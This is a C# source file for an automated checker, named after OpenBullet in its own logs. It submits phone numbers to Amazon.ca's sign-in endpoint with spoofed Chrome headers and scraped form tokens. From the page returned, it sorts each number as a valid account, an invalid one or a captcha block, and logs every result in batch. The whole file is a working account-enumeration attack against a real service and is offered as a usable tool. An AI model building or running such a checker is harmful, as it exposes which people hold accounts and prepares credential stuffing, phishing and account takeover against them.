using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Collections.Generic;
using System.Linq;

// Using Leaf.xNet from DLL - EXACT same as TestBot
using Leaf.xNet;
using HttpStatusCode = Leaf.xNet.HttpStatusCode;

namespace ClosedBullet
{
    public class ValidationResult
    {
        public string PhoneNumber { get; set; }
        public string Status { get; set; }
        public string Reason { get; set; }
        public string DetectionPattern { get; set; }
        public DateTime Timestamp { get; set; }
        public long ResponseTimeMs { get; set; }
        public string ResponseTitle { get; set; }
    }

    public class TestBotEngine
    {
        private static readonly string USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
        private static string resultsDir;
        private static string logFile;
        private static int validCount = 0;
        private static int invalidCount = 0;
        private static int blockedCount = 0;
        private static int unknownCount = 0;
        
        public static int ValidCount { get { return validCount; } }
        public static int InvalidCount { get { return invalidCount; } }
        public static int BlockedCount { get { return blockedCount; } }
        public static int UnknownCount { get { return unknownCount; } }
        
        public static bool SaveHtmlResponses { get; set; } = true;
        
        static TestBotEngine()
        {
            // Initialize results directory like original TestBot
            try
            {
                var currentDir = Directory.GetCurrentDirectory();
                resultsDir = Path.Combine(currentDir, $"TestResults_UI_{DateTime.Now:yyyyMMdd_HHmmss}");
                Directory.CreateDirectory(resultsDir);
                Directory.CreateDirectory(Path.Combine(resultsDir, "HTML_Responses"));
                logFile = Path.Combine(resultsDir, "test.log");
                
                // Use thread-safe logging from the start
                var initMessage = new StringBuilder();
                initMessage.AppendLine($"[{DateTime.Now:HH:mm:ss}] === OPENBULLET COPY ENGINE INITIALIZED ===");
                initMessage.AppendLine($"[{DateTime.Now:HH:mm:ss}] Current Directory: {currentDir}");
                initMessage.AppendLine($"[{DateTime.Now:HH:mm:ss}] Results Directory: {resultsDir}");
                initMessage.AppendLine($"[{DateTime.Now:HH:mm:ss}] Log File: {logFile}");
                
                // Write initialization message using thread-safe method
                try
                {
                    File.WriteAllText(logFile, initMessage.ToString());
                }
                catch (Exception logEx)
                {
                    Console.WriteLine($"Warning: Could not write initial log: {logEx.Message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"ERROR during TestBotEngine initialization: {ex.Message}");
                // Don't throw, just log the error and continue
                resultsDir = Path.Combine(Path.GetTempPath(), $"TestResults_UI_{DateTime.Now:yyyyMMdd_HHmmss}");
                Directory.CreateDirectory(resultsDir);
                Directory.CreateDirectory(Path.Combine(resultsDir, "HTML_Responses"));
                logFile = Path.Combine(resultsDir, "test.log");
            }
        }
        
        // EXACT SAME TestNumber method from TestBot.cs
        public static ValidationResult TestNumber(string phoneNumber)
        {
            // Add detailed logging at the start
            Log($"[ENTRY] Starting validation for: '{phoneNumber}' (Length: {phoneNumber?.Length})");
            
            var result = new ValidationResult
            {
                PhoneNumber = phoneNumber,
                Timestamp = DateTime.Now
            };
            
            var startTime = DateTime.Now;
            
            try
            {
                using (var request = new HttpRequest())
                {
                    // Configure request - EXACT same as TestBot
                    request.UserAgent = USER_AGENT;
                    request.KeepAlive = true;
                    request.AllowAutoRedirect = false;
                    request.ConnectTimeout = 15000;
                    request.ReadWriteTimeout = 15000;
                    request.Cookies = new CookieStorage();
                    
                    // Add browser headers - EXACT same as TestBot
                    request.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
                    request.AddHeader("Accept-Language", "en-US,en;q=0.9");
                    request.AddHeader("Accept-Encoding", "gzip, deflate, br");
                    request.AddHeader("Sec-Ch-Ua", "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"");
                    request.AddHeader("Sec-Ch-Ua-Mobile", "?0");
                    request.AddHeader("Sec-Ch-Ua-Platform", "\"Windows\"");
                    request.AddHeader("Sec-Fetch-Dest", "document");
                    request.AddHeader("Sec-Fetch-Mode", "navigate");
                    request.AddHeader("Sec-Fetch-Site", "none");
                    request.AddHeader("Sec-Fetch-User", "?1");
                    request.AddHeader("Upgrade-Insecure-Requests", "1");
                    
                    // Step 1: GET signin page - EXACT same URL as TestBot
                    var signinUrl = "https://www.amazon.ca/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.ca%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=caflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0";
                    
                    Log($"[{phoneNumber}] Getting signin page");
                    
                    var response = request.Get(signinUrl);
                    
                    // Handle redirects - EXACT same as TestBot
                    while (response.StatusCode == HttpStatusCode.Redirect || 
                           response.StatusCode == HttpStatusCode.MovedPermanently ||
                           response.StatusCode == HttpStatusCode.Found)
                    {
                        var location = response.Location;
                        if (string.IsNullOrEmpty(location)) break;
                        response = request.Get(location.StartsWith("http") ? location : "https://www.amazon.ca" + location);
                    }
                    
                    var html = response.ToString();
                    Log($"[{phoneNumber}] GET Response: {response.StatusCode}, {html.Length} chars");
                    
                    // Check if blocked already - EXACT same as TestBot
                    if (html.Contains("captcha") || html.Contains("CAPTCHA"))
                    {
                        Log($"[{phoneNumber}] BLOCKED: Captcha on GET");
                        blockedCount++;
                        result.Status = "BLOCKED";
                        result.Reason = "Captcha on initial page";
                        result.DetectionPattern = "Captcha";
                        return result;
                    }
                    
                    // Save GET response
                    if (SaveHtmlResponses)
                    {
                        try
                        {
                            // Clean phone number for filename - remove invalid characters
                            var cleanPhoneNumber = phoneNumber.Replace(":", "-").Replace("|", "-").Replace("<", "-").Replace(">", "-").Replace("?", "-").Replace("*", "-").Replace("\"", "-").Replace("/", "-");
                            var htmlFile1 = Path.Combine(resultsDir, "HTML_Responses", $"{cleanPhoneNumber}_GET.html");
                            Log($"[{phoneNumber}] Saving GET response to: {htmlFile1}");
                            File.WriteAllText(htmlFile1, html);
                        }
                        catch (Exception ex)
                        {
                            Log($"[{phoneNumber}] ERROR saving GET response: {ex.Message}");
                        }
                    }
                    
                    // Extract tokens - EXACT same as TestBot
                    var appActionToken = ExtractValue(html, "name=\"appActionToken\" value=\"", "\"");
                    var appAction = ExtractValue(html, "name=\"appAction\" value=\"", "\"");
                    var prevRID = ExtractValue(html, "name=\"prevRID\" value=\"", "\"");
                    var workflowState = ExtractValue(html, "name=\"workflowState\" value=\"", "\"");
                    var subPageType = ExtractValue(html, "name=\"subPageType\" value=\"", "\"");
                    var openidReturnTo = ExtractValue(html, "name=\"openid.return_to\" value=\"", "\"");
                    var metadata1 = ExtractValue(html, "name=\"metadata1\" value=\"", "\"");
                    
                    if (string.IsNullOrEmpty(appActionToken))
                    {
                        Log($"[{phoneNumber}] WARNING: No appActionToken");
                    }
                    
                    // Step 2: POST phone number - EXACT same as TestBot
                    Log($"[{phoneNumber}] Submitting phone number");
                    
                    // Build form data - EXACT same as TestBot
                    var formData = new StringBuilder();
                    if (!string.IsNullOrEmpty(appActionToken))
                        formData.Append($"appActionToken={Uri.EscapeDataString(appActionToken)}&");
                    if (!string.IsNullOrEmpty(appAction))
                        formData.Append($"appAction={Uri.EscapeDataString(appAction)}&");
                    else
                        formData.Append("appAction=SIGNIN_PWD_COLLECT&");
                    if (!string.IsNullOrEmpty(subPageType))
                        formData.Append($"subPageType={Uri.EscapeDataString(subPageType)}&");
                    if (!string.IsNullOrEmpty(metadata1))
                        formData.Append($"metadata1={Uri.EscapeDataString(metadata1)}&");
                    if (!string.IsNullOrEmpty(openidReturnTo))
                        formData.Append($"openid.return_to={Uri.EscapeDataString(openidReturnTo)}&");
                    if (!string.IsNullOrEmpty(prevRID))
                        formData.Append($"prevRID={Uri.EscapeDataString(prevRID)}&");
                    if (!string.IsNullOrEmpty(workflowState))
                        formData.Append($"workflowState={Uri.EscapeDataString(workflowState)}&");
                    
                    formData.Append($"email={phoneNumber}&password=&create=0");
                    var postData = formData.ToString();
                    
                    // Set POST headers - EXACT same as TestBot
                    request.Referer = signinUrl;
                    request.AddHeader("Origin", "https://www.amazon.ca");
                    request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                    request.AddHeader("Sec-Fetch-Site", "same-origin");
                    request.AddHeader("Cache-Control", "max-age=0");
                    
                    // POST to base URL - EXACT same as TestBot
                    var submitUrl = "https://www.amazon.ca/ap/signin";
                    Log($"[{phoneNumber}] POSTing to: {submitUrl}");
                    
                    var submitResponse = request.Post(submitUrl, postData, "application/x-www-form-urlencoded");
                    
                    // Handle POST redirects - EXACT same as TestBot
                    int redirectCount = 0;
                    while ((submitResponse.StatusCode == HttpStatusCode.Redirect || 
                            submitResponse.StatusCode == HttpStatusCode.MovedPermanently ||
                            submitResponse.StatusCode == HttpStatusCode.Found) && redirectCount < 5)
                    {
                        var location = submitResponse.Location;
                        if (string.IsNullOrEmpty(location)) break;
                        Log($"[{phoneNumber}] Redirect {++redirectCount}: {location}");
                        submitResponse = request.Get(location.StartsWith("http") ? location : "https://www.amazon.ca" + location);
                    }
                    
                    var responseHtml = submitResponse.ToString();
                    Log($"[{phoneNumber}] POST Response: {submitResponse.StatusCode}, {responseHtml.Length} chars");
                    
                    // Save POST response
                    if (SaveHtmlResponses)
                    {
                        try
                        {
                            // Clean phone number for filename - remove invalid characters
                            var cleanPhoneNumber = phoneNumber.Replace(":", "-").Replace("|", "-").Replace("<", "-").Replace(">", "-").Replace("?", "-").Replace("*", "-").Replace("\"", "-").Replace("/", "-");
                            var htmlFile2 = Path.Combine(resultsDir, "HTML_Responses", $"{cleanPhoneNumber}_POST.html");
                            Log($"[{phoneNumber}] Saving POST response to: {htmlFile2}");
                            File.WriteAllText(htmlFile2, responseHtml);
                        }
                        catch (Exception ex)
                        {
                            Log($"[{phoneNumber}] ERROR saving POST response: {ex.Message}");
                        }
                    }
                    
                    // Analyze response - EXACT same as TestBot
                    var analysis = AnalyzeResponse(phoneNumber, responseHtml);
                    result.Status = analysis.Status;
                    result.Reason = analysis.Reason;
                    result.DetectionPattern = analysis.Pattern;
                    result.ResponseTitle = ExtractValue(responseHtml, "<title>", "</title>");
                    
                    result.ResponseTimeMs = (long)(DateTime.Now - startTime).TotalMilliseconds;
                    
                    return result;
                }
            }
            catch (Exception ex)
            {
                Log($"[{phoneNumber}] ERROR: {ex.Message}");
                unknownCount++;
                result.Status = "ERROR";
                result.Reason = ex.Message;
                result.DetectionPattern = "Error";
                result.ResponseTimeMs = (long)(DateTime.Now - startTime).TotalMilliseconds;
                return result;
            }
        }
        
        // EXACT SAME AnalyzeResponse method from TestBot.cs
        private static (string Status, string Reason, string Pattern) AnalyzeResponse(string phoneNumber, string html)
        {
            // Extract title for logging
            var title = ExtractValue(html, "<title>", "</title>");
            Log($"[{phoneNumber}] Title: {title}");
            
            // Check for captcha/blocking first - EXACT same as TestBot
            if (html.Contains("captcha") || html.Contains("CAPTCHA") || 
                html.Contains("automated access") || html.Contains("robot"))
            {
                Log($"[{phoneNumber}] RESULT: BLOCKED");
                blockedCount++;
                return ("BLOCKED", "Captcha/Bot detection", "Captcha");
            }
            
            // Check for OTP challenge (indicates valid account with extra security) - EXACT same as TestBot
            bool hasOTPChallenge = html.Contains("Send OTP") || 
                                   html.Contains("OTPChallengeOptions") ||
                                   html.Contains("One Time Password") ||
                                   html.Contains("multi-factor authentication") ||
                                   html.Contains("two-step verification");
            
            // Check for actual password field (indicates valid account) - EXACT same as TestBot
            bool hasPasswordField = Regex.IsMatch(html, @"<input[^>]*type\s*=\s*[""']password[""'][^>]*id\s*=\s*[""']ap_password[""'][^>]*>", RegexOptions.IgnoreCase);
            bool hasEnterPasswordText = html.Contains("Enter your password");
            
            // Check for error messages (indicates invalid account) - EXACT same as TestBot
            bool hasCannotFindError = html.Contains("We cannot find an account") || 
                                      html.Contains("We can't find an account");
            bool hasWrongInvalidError = html.Contains("Wrong or Invalid") || 
                                        html.Contains("There was a problem");
            bool hasNoAccountError = html.Contains("No account found");
            
            // Check for create account option - EXACT same as TestBot
            bool hasCreateAccount = html.Contains("Create your Amazon account");
            
            // Determine result - EXACT same logic as TestBot
            string result;
            string reason;
            string pattern;
            
            if (hasOTPChallenge)
            {
                result = "VALID";
                reason = "OTP challenge shown - account exists with extra security";
                pattern = "OTPChallenge";
                validCount++;
            }
            else if (hasPasswordField && hasEnterPasswordText)
            {
                result = "VALID";
                reason = "Password field shown - account exists";
                pattern = "PasswordField";
                validCount++;
            }
            else if (hasCannotFindError || hasWrongInvalidError || hasNoAccountError)
            {
                result = "INVALID";
                reason = "Error message - no account found";
                pattern = "ErrorMessage";
                invalidCount++;
            }
            else if (hasCreateAccount && !hasPasswordField)
            {
                result = "INVALID";
                reason = "Redirected to create account";
                pattern = "CreateAccount";
                invalidCount++;
            }
            else
            {
                result = "UNKNOWN";
                reason = "Could not determine from response";
                pattern = "Unknown";
                unknownCount++;
                
                // Log what we found for debugging - EXACT same as TestBot
                Log($"[{phoneNumber}] Debug - OTP challenge: {hasOTPChallenge}");
                Log($"[{phoneNumber}] Debug - Password field: {hasPasswordField}");
                Log($"[{phoneNumber}] Debug - Enter password text: {hasEnterPasswordText}");
                Log($"[{phoneNumber}] Debug - Cannot find error: {hasCannotFindError}");
                Log($"[{phoneNumber}] Debug - Create account: {hasCreateAccount}");
            }
            
            Log($"[{phoneNumber}] RESULT: {result} - {reason}");
            
            // Save to summary
            var summaryFile = Path.Combine(resultsDir, "results_summary.txt");
            File.AppendAllText(summaryFile, $"{phoneNumber}: {result} - {reason}\n");
            
            return (result, reason, pattern);
        }
        
        // EXACT SAME ExtractValue method from TestBot.cs
        private static string ExtractValue(string html, string start, string end)
        {
            try
            {
                int startIndex = html.IndexOf(start);
                if (startIndex == -1) return "";
                startIndex += start.Length;
                int endIndex = html.IndexOf(end, startIndex);
                if (endIndex == -1) return "";
                return html.Substring(startIndex, endIndex - startIndex);
            }
            catch
            {
                return "";
            }
        }
        
        private static readonly object logLock = new object();
        
        private static void Log(string message)
        {
            var logEntry = $"[{DateTime.Now:HH:mm:ss}] {message}";
            
            // Thread-safe file writing
            lock (logLock)
            {
                try
                {
                    File.AppendAllText(logFile, logEntry + Environment.NewLine);
                }
                catch (IOException)
                {
                    // If file is locked, try to write to console instead
                    Console.WriteLine(logEntry);
                }
            }
        }
        
        public static void ResetCounters()
        {
            validCount = 0;
            invalidCount = 0;
            blockedCount = 0;
            unknownCount = 0;
        }
    }
}